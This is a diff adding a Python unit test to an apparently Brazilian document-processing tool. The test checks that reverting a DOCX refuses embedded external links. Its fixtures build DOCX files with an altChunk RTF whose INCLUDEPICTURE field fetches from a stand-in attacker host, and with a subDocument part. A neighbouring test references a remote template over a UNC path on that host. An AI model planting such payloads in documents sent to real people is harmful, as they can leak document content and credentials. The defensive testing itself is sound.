@@ -1639,6 +1639,25 @@ class Arquivos(unittest.TestCase):
             self.assertFalse(os.path.exists(saida))
 
     @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_recusa_altchunk_interno_com_rtf(self):
+        base = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+        rtf = b'{\\rtf1{\\field{\\*\\fldinst INCLUDEPICTURE "https://atacante.example/{ REF marca }"}}}'
+        tipos = '<Default Extension="rtf" ContentType="application/rtf"/>'
+        rels = '<Relationship Id="rId8" Type="%saFChunk" Target="bloco.rtf"/>' % base
+        corpos = ('<w:p><w:r><w:t>[CPF_1]</w:t></w:r></w:p>',
+                  '<w:p><w:r><w:t>[CPF_1]</w:t></w:r></w:p><w:altChunk r:id="rId8"/>')
+        for i, corpo in enumerate(corpos):
+            origem = self._docx_cru("alt%d.docx" % i, corpo, rels, partes_extra={"word/bloco.rtf": rtf}, tipos_extra=tipos)
+            saida = os.path.join(self.tmp, "alt%d-v.docx" % i)
+            r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+            self.assertEqual((r["ok"], r.get("codigo")), (False, "vinculo_externo"), (i, r))
+            self.assertFalse(os.path.exists(saida))
+        rels2 = '<Relationship Id="rId8" Type="%ssubDocument" Target="sub.docx"/>' % base
+        origem = self._docx_cru("sub.docx", corpos[0], rels2, partes_extra={"word/sub.docx": b"PK"})
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": os.path.join(self.tmp, "sub-v.docx"), "tabela": self._TAB_CPF})
+        self.assertEqual((r["ok"], r.get("codigo")), (False, "vinculo_externo"), r)
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
     def test_docx_reverter_recusa_modelo_anexo_em_settings(self):
         base = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
         settings_rels = '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="%sattachedTemplate" Target="file:///\\\\atacante.example\\m.dotm" TargetMode="External"/></Relationships>' % base
